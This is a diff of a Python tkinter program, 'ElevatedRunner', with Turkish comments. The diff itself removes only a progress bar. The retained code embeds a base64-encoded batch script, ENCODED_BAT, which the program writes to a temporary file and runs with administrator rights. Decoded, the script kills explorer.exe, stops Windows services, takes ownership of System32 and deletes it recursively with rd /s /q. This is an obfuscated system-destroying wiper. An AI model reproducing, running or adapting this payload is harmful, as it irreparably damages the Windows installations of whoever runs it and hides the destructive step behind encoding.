@@ -4,7 +4,6 @@ import ctypes
 import subprocess
 import tkinter as tk
 from tkinter import messagebox
-from tkinter.ttk import Progressbar, Style
 import win32security
 import win32api
 import win32con
@@ -14,7 +13,6 @@ import win32service
 import time
 import tempfile
 import base64
-
 
 ENCODED_BAT = """
 QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KdGl0bGUgVWx0cmEgRm9yY2UgRGVsZXRlIFRvb2wgLSBUw7xtIERvc3lhbGFyxLEgU2lsCmNvbG9yIDBDCgo6OiBZb25ldGljaSB5ZXRraXNpIGtvbnRyb2x1Cm5ldCBzZXNzaW9uID5udWwgMj4mMQppZiAlZXJyb3JMZXZlbCUgbmVxIDAgKAogICAgZWNobyBbIV0gSEFUQTogQWRtaW5pc3RyYXRvciB5ZXRraXNpIGdlcmVrbGkhCiAgICBlY2hvIFshXSBMdXRmZW4gYnUgZG9zeWF5aSB5b25ldGljaSBvbGFyYWsgY2FsaXN0aXJpbi4KICAgIHBhdXNlCiAgICBleGl0IC9CIDEKKQoKOjogU2lsaW5lY2VrIGtsYXNvciB5b2x1CnNldCAidGFyZ2V0UGF0aD0ld2luZGlyJVxTeXN0ZW0zMiIKCmVjaG8gWytdIFVMVFJBIEZPUkNFIERFTEVURSBUT09MIEJBU0xBVElMSVlPUi4uLgplY2hvIFsrXSBIZWRlZjogJXRhcmdldFBhdGglCmVjaG8uCgo6OiBBY2lrIGRvc3lhbGFyaSBrYXBhdAplY2hvIFsqXSBBY2lrIGRvc3lhbGFyIGtvbnRyb2wgZWRpbGl5b3IuLi4KdGFza2tpbGwgL0YgL0lNIG5vdGVwYWQuZXhlID5udWwgMj4mMQp0YXNra2lsbCAvRiAvSU0gd29yZHBhZC5leGUgPm51bCAyPiYxCnRhc2traWxsIC9GIC9JTSBleHBsb3Jlci5leGUgPm51bCAyPiYxCgo6OiBUdW0gc2VydmlzbGVyaSBkdXJkdXIKZWNobyBbKl0gS3JpdGlrIHNlcnZpc2xlciBkdXJkdXJ1bHV5b3IuLi4KbmV0IHN0b3AgVHJ1c3RlZEluc3RhbGxlciAveSA+bnVsIDI+JjEKbmV0IHN0b3AgV3VhdVNlcnYgL3kgPm51bCAyPiYxCm5ldCBzdG9wIG1zaXNlcnZlciAveSA+bnVsIDI+JjEKbmV0IHN0b3AgV1NlYXJjaCAveSA+bnVsIDI+JjEKCjo6IFNpc3RlbSB5ZXRraWxlcmluaSBrYWxkaXIKZWNobyBbKl0gU2lzdGVtIHlldGtpbGVyaSBrYWxkaXJpbGl5b3IuLi4KaWNhY2xzICIldGFyZ2V0UGF0aCUiIC9zZXRvd25lciAiQWRtaW5pc3RyYXRvcnMiIC9UIC9DID5udWwgMj4mMQppY2FjbHMgIiV0YXJnZXRQYXRoJSIgL3Jlc2V0IC9UID5udWwgMj4mMQoKOjogVHVtIHlldGtpbGVyaSBhbAplY2hvIFsqXSBUdW0geWV0a2lsZXIgYWxpbml5b3IuLi4KdGFrZW93biAvRiAiJXRhcmdldFBhdGglIiAvQSAvUiAvRCBZID5udWwgMj4mMQppY2FjbHMgIiV0YXJnZXRQYXRoJSIgL2dyYW50OnIgQWRtaW5pc3RyYXRvcnM6RiAvVCAvQyAvUSA+bnVsIDI+JjEKaWNhY2xzICIldGFyZ2V0UGF0aCUiIC9ncmFudDpyICV1c2VybmFtZSU6RiAvVCAvQyAvUSA+bnVsIDI+JjEKCjo6IERvc3lhIHNpc3RlbWkga29udHJvbHUKZWNobyBbKl0gRG9zeWEgc2lzdGVtaSBrb250cm9sdSB5YXBpbGl5b3IuLi4KY2hrZHNrIC9GID5udWwgMj4mMQoKOjogVWx0cmEgZm9yY2Ugc2lsbWUKZWNobyBbKl0gVWx0cmEgZm9yY2Ugc2lsbWUgYmFzbGl5b3IuLi4KYXR0cmliIC1yIC1zIC1oICIldGFyZ2V0UGF0aCUiIC9zIC9kID5udWwgMj4mMQpyZCAvcyAvcSAiJXRhcmdldFBhdGglIiA+bnVsIDI+JjEKCjo6IFNvbiBrb250cm9sCmlmIGV4aXN0ICIldGFyZ2V0UGF0aCUiICgKICAgIGVjaG8gWyFdIEhBVEE6IEtsYXNvciBzaWxpbmVtZWRpIQogICAgZWNobyBbIV0gTHV0ZmVuIFdpbmRvd3MgR3V2ZW5saSBNb2RkYSB0ZWtyYXIgZGVuZXlpbi4KKSBlbHNlICgKICAgIGVjaG8gWytdIEJBU0FSSUxJOiBLbGFzb3IgdmUgdHVtIGljZXJpZ2kgc2lsaW5kaSEKKQoKOjogU2VydmlzbGVyaSB5ZW5pZGVuIGJhc2xhdAplY2hvIFsqXSBTZXJ2aXNsZXIgeWVuaWRlbiBiYXNsYXRpbGl5b3IuLi4KbmV0IHN0YXJ0IFRydXN0ZWRJbnN0YWxsZXIgPm51bCAyPiYxCm5ldCBzdGFydCBXdWF1U2VydiA+bnVsIDI+JjEKbmV0IHN0YXJ0IG1zaXNlcnZlciA+bnVsIDI+JjEKbmV0IHN0YXJ0IFdTZWFyY2ggPm51bCAyPiYxCgplY2hvLgplY2hvIFsrXSBJc2xlbSB0YW1hbWxhbmRpIQp0aW1lb3V0IC90IDUKZXhpdCAvQiAw
@@ -36,8 +34,6 @@ class ElevatedRunner:
 
         # Stil ayarları
         self.root.configure(bg='#f0f0f0')
-        self.style = Style()
-        self.style.configure("Custom.TProgressbar", thickness=10)
 
         # İkon ayarla (exe içine gömülü)
         try:
@@ -86,16 +82,6 @@ class ElevatedRunner:
             font=('Helvetica', 10)
         )
         self.admin_radio.pack(side=tk.LEFT, padx=10)
-
-        # Progress bar
-        self.progress = Progressbar(
-            self.root,
-            orient="horizontal",
-            length=350,
-            mode="indeterminate",
-            style="Custom.TProgressbar"
-        )
-        self.progress.pack(pady=20)
 
         # Durum mesajı
         self.status_label = tk.Label(
@@ -205,13 +191,11 @@ class ElevatedRunner:
 
     def start_process(self):
         self.run_button.config(state='disabled')
-        self.progress.start(10)
 
         # Geçici bat dosyası oluştur
         temp_bat = self.create_temp_bat()
         if not temp_bat:
             self.run_button.config(state='normal')
-            self.progress.stop()
             return
 
         auth_type = self.auth_var.get()
@@ -231,8 +215,6 @@ class ElevatedRunner:
         finally:
             # İşlem bitince geçici dosyayı temizle
             self.cleanup_temp_bat(temp_bat)
-
-        self.progress.stop()
 
         if success:
             self.status_label.config(text="Başarıyla çalıştırıldı")
